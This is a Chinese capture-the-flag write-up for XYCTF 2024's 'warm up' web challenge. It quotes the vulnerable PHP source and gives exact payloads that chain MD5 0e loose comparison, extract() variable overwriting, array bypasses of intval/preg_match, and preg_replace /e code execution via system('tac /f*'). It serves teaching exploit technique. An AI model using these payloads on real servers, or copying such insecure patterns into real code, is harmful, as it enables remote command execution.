# warm up

> 分类：Web

## 题目描述
MD5 八股 + 变量覆盖 + preg_replace `/e` 命令执行的综合题。第一关通过 MD5 弱比较与 extract 变量覆盖进入第二关，第二关利用数组绕过 preg_match 并触发 preg_replace 的 `/e` 修饰符执行系统命令。

## 考察知识点
- MD5 弱比较（0e 开头）与数组绕过
- `extract($_GET)` 变量覆盖
- `intval()` 数组绕过、`preg_match()` 数组绕过
- `preg_replace()` `/e` 修饰符命令执行

## 解法
第一关源码关键逻辑：
```php
extract($_GET);
if (isset($_GET['val1']) && isset($_GET['val2']) && $_GET['val1'] != $_GET['val2'] && md5($_GET['val1']) == md5($_GET['val2'])) { ... }
if (isset($md5) && $md5 == md5($md5)) { ... }
if ($XY == $XYCTF) {
    if ($XY != "XYCTF_550102591" && md5($XY) == md5("XYCTF_550102591")) { echo $level2; }
}
```
payload（`0e215962017` 的 md5 仍为 0e 开头，满足弱比较）：
```
?val1[]=1&val2[]=2&md5=0e215962017&XY=0e215962017&XYCTF=0e215962017
```
`extract` 直接覆盖了 `$XYCTF`，使 `$XY == $XYCTF` 成立。

得到 `LLeeevvveeelll222.php`，第二关源码：
```php
if (isset($_POST['a']) && !preg_match('/[0-9]/', $_POST['a']) && intval($_POST['a'])) {
    echo preg_replace($_GET['a'],$_GET['b'],$_GET['c']);
}
```
- `$_POST['a']` 用数组绕过 `preg_match` 与 `intval`（intval 对数组返回 1）。
- `preg_replace` 的 `/e` 修饰符可执行任意代码。

payload：
```
?a=/1/e&b=system('tac /f*')&c=1
POST: a[]=1
```

## 参考答案
（未给出，见截图）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
